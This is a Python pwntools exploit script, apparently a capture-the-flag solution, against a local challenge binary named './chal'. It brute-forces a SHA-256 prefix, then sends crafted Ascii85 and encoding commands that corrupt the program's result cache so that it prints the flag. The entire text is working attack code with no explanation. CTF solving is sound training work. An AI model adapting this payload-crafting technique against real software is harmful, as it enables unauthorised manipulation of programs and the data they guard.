from pwn import *
context.arch='amd64'
p=process('./chal')
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)

def cmd(enc,dec,c):
    sla(b"Awaiting command...\n",f"{scheme(enc)}\t{scheme(dec)}\t{c}".encode())
def scheme(idx):
    sc = ['plain','hex','a85','b64','zlib','rot13'," "]
    return sc[idx]
tabel = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~'
def num2a85(num):
    rrr = []
    while num:
        rrr.append(num%85)
        num = int(num//85)
    res = ''
    for x in rrr:
        res+=tabel[x]
    return res
def sha256(num):
    s = str(num).encode()
    h = hashlib.new('sha256')
    h.update(s)
    return h.hexdigest()
def findTarget():
    ct = 0 
    while(1):
        ct+=1
        if sha256(ct).startswith('a85'):
            return ct
num = findTarget()
for x in range(8):
    cmd(0,0,'pad'+str(x))
for x in range(6):
    cmd(2,0,sha256(num)[3:]+'iiii'+'0CsN|'*x+num2a85(0x1010100FF)+'0CsN|'*(10-x))
ru(b"Awaiting command...\n")
sl(f'plain plain {num}'.encode())
ru(b" cache. Result: ")
flag = ru(b'\n')
warn(flag.decode())
p.close()
